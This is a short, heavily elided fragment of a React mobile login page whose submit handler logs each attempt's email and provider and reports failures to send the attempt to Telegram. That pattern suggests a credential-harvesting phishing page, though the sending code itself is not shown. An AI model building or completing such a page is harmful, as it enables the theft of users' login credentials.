...
const MobileLoginPage: React.FC<LoginPageProps> = ({ 
  ...
  const handleFormSubmit = async (e: React.FormEvent) => {
    ...
    try {
      ...
      console.log(`🔐 Mobile login attempt ${currentAttempt}:`, { email, provider: selectedProvider });
      ...
      try {
        ...
        console.error(`❌ Failed to send mobile attempt ${currentAttempt} to Telegram:`, error);
      }
